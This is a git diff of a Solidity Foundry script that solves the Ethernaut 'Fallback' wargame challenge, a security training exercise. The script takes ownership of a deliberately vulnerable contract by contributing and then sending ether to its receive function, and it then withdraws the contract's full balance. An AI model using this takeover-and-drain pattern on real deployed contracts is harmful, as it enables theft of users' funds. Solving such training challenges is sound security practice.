@@ -11,30 +11,34 @@ interface IFallbackContract {
     function withdraw() external;
 }
 
+/// @author agadzhalov
+/// @title Solution to Fallback Ethernaut challange
 contract FallbackScript is Script {
 
     address constant FALLBACK_ADDRESS = address(0xcd71D3eB43de6D6F914807f2198e91686bE7981b);
     IFallbackContract public fallbackContract = IFallbackContract(payable(FALLBACK_ADDRESS));
-
+    
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        
+        // 1. Display the current owner
         console.log("1. Current owner is", fallbackContract.owner());
 
-        // Contribute in order to pass validation in 
-        // the receive method contributions[msg.sender] > 0
+        // 2. Contribute to pass the validation check in receive method (contributions[msg.sender] > 0)
         fallbackContract.contribute{value: 1e1}();
 
-        // Take ownership of the contract by sending very small amount of ether 
-        (bool success, ) = address(FALLBACK_ADDRESS).call{value: 1e1}("");
+        // 3. Take ownership of the contract by sending very small amount of ether
+        (bool success, ) = payable(FALLBACK_ADDRESS).call{value: 0.1 ether}("");
+        require(success, "Failed to send Ether for ownership transfer");
 
-        if (success) {
-            console.log("2. New owner is", fallbackContract.owner());
+        // 4. After we are already the owner we can withraw all the ethers
+        console.log("2. New owner is", fallbackContract.owner());
+        fallbackContract.withdraw();
 
-            // After we are already the owner we can withraw all the ethers
-            fallbackContract.withdraw();
-            console.log("3. Wallet's balance", vm.envAddress("WALLLET_ADDRESS").balance);
-            console.log("4. Contract's balance", address(fallbackContract).balance);
-        }
+        // 5. Log the final wallet and contract balances
+        console.log("3. Wallet's balance:", vm.envAddress("WALLET_ADDRESS").balance);
+        console.log("4. Contract's balance:", address(fallbackContract).balance);
+        
         vm.stopBroadcast();
     }
 }
